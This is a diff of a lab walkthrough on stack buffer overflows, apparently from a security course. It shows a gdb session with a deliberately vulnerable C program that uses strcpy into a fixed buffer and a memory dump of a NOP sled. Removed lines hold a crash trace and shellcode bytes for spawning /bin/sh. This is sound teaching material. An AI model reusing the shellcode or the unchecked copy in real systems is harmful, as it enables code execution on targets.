@@ -575,43 +575,45 @@ When inspecting the memory, we can see our payload was injected as
 expected:
 
 ```bash
+
+┌─[khaefner@cs456-010]─[~/Development/buffer_overflow]
+└──╼ $gdb ./vuln 
+Reading symbols from ./vuln...
+(gdb) list main
+1	#include <stdio.h>
+2	#include <string.h>
+3	
+4	int main (int argc, char** argv) {
+5	  char buffer [500];
+6	  strcpy(buffer, argv[1]);
+7	  return 0;
+8	}
+(gdb) break 7
+Breakpoint 1 at 0x11bb: file vuln.c, line 7.
 (gdb) run $(python3 exploit-test.py)
 Starting program: /home/khaefner/Development/buffer_overflow/vuln $(python3 exploit-test.py)
 [Thread debugging using libthread_db enabled]
 Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 
-Program received signal SIGSEGV, Segmentation fault.
-0x43434343 in ?? ()
-(gdb) info registers
-eax            0x0                 0
-ecx            0xffffd4e0          -11040
-edx            0xffffd07b          -12165
-ebx            0x43434343          1128481603
-esp            0xffffd080          0xffffd080
-ebp            0x43434343          0x43434343
-esi            0x56558eec          1448447724
-edi            0xf7ffcb80          -134231168
-eip            0x43434343          0x43434343
-eflags         0x10292             [ AF SF IF RF ]
-cs             0x23                35
-ss             0x2b                43
-ds             0x2b                43
-es             0x2b                43
-fs             0x0                 0
-gs             0x63                99
-
+Breakpoint 1, main (argc=0, argv=0xffffd134) at vuln.c:7
+7	  return 0;
+(gdb) print &buffer
+$1 = (char (*)[500]) 0xffffce80
+(gdb) x/40xb 0xffffce80
+0xffffce80:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xffffce88:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xffffce90:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xffffce98:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xffffcea0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+---
 ```
+
 ---
 `Action:`  Take a screen shot of your memory layout
 ---
 
-```bash
-(gdb) x/16x $sp+430
-0xffffcfee:	0x90909090	0x90909090	0x90909090	0x90909090
-0xffffcffe:	0x50c03190	0x732f6e68	0x2f2f6868	0xe3896962
-0xffffd00e:	0x53e28950	0x0bb0e189	0x434380cd	0x43434343
-0xffffd01e:	0x43434343	0x43434343	0x43434343	0x43434343
-```
+
+
 
 ![buffer overflow memory
 inspection](https://github.com/hg8/hg8.github.io/assets/9076747/a8b81bb7-2590-47e9-bc15-c2071f7d7f03)
